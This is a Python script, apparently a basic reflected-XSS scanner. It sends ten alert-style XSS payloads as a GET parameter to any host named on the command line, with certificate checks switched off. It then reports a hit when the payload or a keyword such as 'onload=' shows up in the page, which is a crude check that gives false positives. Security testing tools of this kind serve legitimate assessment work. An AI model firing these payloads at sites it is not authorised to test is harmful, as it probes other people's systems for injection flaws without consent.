'#!/usr/bin/env python3
import sys
import requests
import urllib3
from urllib.parse import urlparse
import argparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScanner:
    def __init__(self):
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert(1)>",
            "<input type=button onclick=alert(1) value=Click>",
            "<a href='javascript:alert(1)'>click</a>",
            "'><script>alert(1)</script>",
            '"<script>alert(1)</script>',
            "<script>confirm(1)</script>"
        ]
        
    def normalize_target(self, target):
        """Convert IP, domain, or URL to full URL"""
        if not target.startswith(('http://', 'https://')):
            # Try HTTPS first, then HTTP
            return f'https://{target}'
        return target
    
    def test_connection(self, url):
        """Test if target is reachable"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            return True, response.status_code
        except requests.exceptions.SSLError:
            # Try HTTP if HTTPS fails
            http_url = url.replace('https://', 'http://')
            try:
                response = requests.get(http_url, timeout=10, verify=False)
                return True, response.status_code
            except:
                return False, None
        except:
            return False, None
    
    def scan_target(self, target):
        """Scan a target for XSS vulnerabilities"""
        url = self.normalize_target(target)
        
        print(f"[+] Target: {target}")
        print(f"[+] Testing URL: {url}")
        print(f"[+] Checking connectivity...")
        
        # Test connection
        reachable, status = self.test_connection(url)
        if not reachable:
            # Try HTTP if HTTPS failed
            if url.startswith('https://'):
                url = url.replace('https://', 'http://')
                print(f"[!] HTTPS failed, trying HTTP: {url}")
                reachable, status = self.test_connection(url)
        
        if not reachable:
            print(f"[!] ERROR: Cannot connect to {target}")
            print(f"[!] Target may be down or unreachable")
            return []
        
        print(f"[+] Connected successfully! (Status: {status})")
        print(f"[+] Starting XSS scan with {len(self.payloads)} payloads...")
        print("-" * 60)
        
        vulnerabilities = []
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"[{i}/{len(self.payloads)}] Testing: {payload[:50]}...")
            
            try:
                # Test GET parameter
                test_url = f"{url}?test={payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                
                if self.check_xss(response.text, payload):
                    vuln = {
                        'url': test_url,
                        'payload': payload,
                        'method': 'GET',
                        'type': 'Reflected XSS'
                    }
                    vulnerabilities.append(vuln)
                    print(f"    [!] VULNERABLE - Payload reflected!")
                else:
                    print(f"    [-] Safe - Not reflected")
                    
            except requests.exceptions.RequestException as e:
                print(f"    [!] Request failed: {str(e)[:50]}...")
            except Exception as e:
                print(f"    [!] Error: {str(e)[:50]}...")
        
        return vulnerabilities
    
    def check_xss(self, response_text, payload):
        """Check if XSS payload was reflected"""
        # Simple reflection check
        if payload.lower() in response_text.lower():
            return True
        
        # Check for XSS indicators
        indicators = ['alert(', 'confirm(', '<script', 'javascript:', 'onerror=', 'onload=']
        response_lower = response_text.lower()
        
        for indicator in indicators:
            if indicator in payload.lower() and indicator in response_lower:
                return True
        
        return False
    
    def display_results(self, vulnerabilities, target):
        """Display scan results"""
        print("\n" + "=" * 60)
        print("SCAN RESULTS")
        print("=" * 60)
        print(f"Target: {target}")
        
        if vulnerabilities:
            print(f"Status: VULNERABLE")
            print(f"Found: {len(vulnerabilities)} XSS vulnerability(s)")
            print() 
            
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"Vulnerability #{i}:")
                print(f"  Type: {vuln['type']}")
                print(f"  Method: {vuln['method']}")
                print(f"  Payload: {vuln['payload']}")
                print(f"  URL: {vuln['url']}")
                print() 
        else:
            print(f"Status: SECURE")
            print(f"Found: 0 XSS vulnerabilities")
            print("[+] Target appears protected against basic XSS attacks")
        
        print("=" * 60)

def main():
    parser = argparse.ArgumentParser(
        description='XSS Vulnerability Scanner - Test websites for XSS vulnerabilities',
        epilog='Examples:\n  %(prog)s 192.168.1.100\n  %(prog)s example.com\n  %(prog)s https://target.com/page',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('target', help='Target to scan (IP, domain, or URL)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # Handle case where no arguments provided
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    # Initialize scanner
    scanner = XSSScanner()
    
    try:
        # Scan target
        vulnerabilities = scanner.scan_target(args.target)
        
        # Display results
        scanner.display_results(vulnerabilities, args.target)
        
        # Exit with appropriate code
        sys.exit(1 if vulnerabilities else 0)
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()'